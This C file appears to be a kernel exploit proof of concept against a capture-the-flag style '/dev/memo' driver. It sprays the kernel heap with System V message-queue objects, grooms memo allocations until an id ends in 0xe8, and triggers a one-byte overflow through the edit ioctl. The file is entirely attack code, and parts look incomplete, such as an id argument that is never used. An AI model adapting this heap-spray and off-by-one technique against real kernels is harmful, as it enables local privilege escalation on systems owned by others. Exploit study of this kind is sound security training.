#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>

#define CMD_NEW  (0x11451401)
#define CMD_EDIT (0x11451402)
#define CMD_DEL  (0x11451403)

#define NUM_SPRAY (0x100)


typedef struct {
  char data[20];
  int id;
  int size;
} request_t;


static long new_memo(int fd) {
    long id;
    request_t req;
    memset(&req, 0, sizeof(request_t));
    id = ioctl(fd, CMD_NEW, &req);
    return id;
}


static long edit_memo(int fd, char *data, int id, int size) {
    long ret;
    request_t req;
    memset(&req, 0, sizeof(request_t));
    memcpy(req.data, data, size);
    req.size = size;
    ret = ioctl(fd, CMD_EDIT, &req);
    return ret;
}


static long del_memo(int fd, int id) {
    long ret;
    request_t req;
    memset(&req, 0, sizeof(request_t));
    req.id = id;
    ret = ioctl(fd, CMD_DEL, &req);
    return ret;
}


struct msgbuf {
    long mtype;
    // 0x40 is the wanted kmalloc() size.
    // 0x30 is the header size of msg_msg.
    char mtext[0x40 - 0x30];
};


static void send_msg(int qid, int msgtype) {
    struct msgbuf msg;
    msg.mtype = msgtype;
    memset(msg.mtext, '0', sizeof(msg.mtext));
    if (msgsnd(qid, (void *)(&msg), sizeof(msg.mtext), IPC_NOWAIT) == -1) {
        perror("msgsnd");
        exit(1);
    }
}


int main(void) {
    int i, fd;
    int qid;
    int msgkey = 1234;

    qid = msgget(msgkey, IPC_CREAT | 0666);
    for (i = 0; i < NUM_SPRAY; i++) {
        send_msg(qid, 1);
    }

    if ((fd = open("/dev/memo", O_RDWR)) < 0) {
        perror("open");
        exit(1);
    }
    long id;
    for (i = 0; i < 0x1000; i++) {
        id = new_memo(fd);
        if ((id & 0xff) == 0xe8)
            break;
        del_memo(fd, id);
    }
    if ((id & 0xff) != 0xe8) {
        puts("failed to allocate (id & 0xff) == 0xe8");
        exit(1);
    }
    printf("id = %lx\n", id);

    char buf[20];
    memset(buf, 0, sizeof(buf));
    // Overflow 1 byte with LSB of id (0xe8)
    edit_memo(fd, buf, id, 21);

    return 0;
}
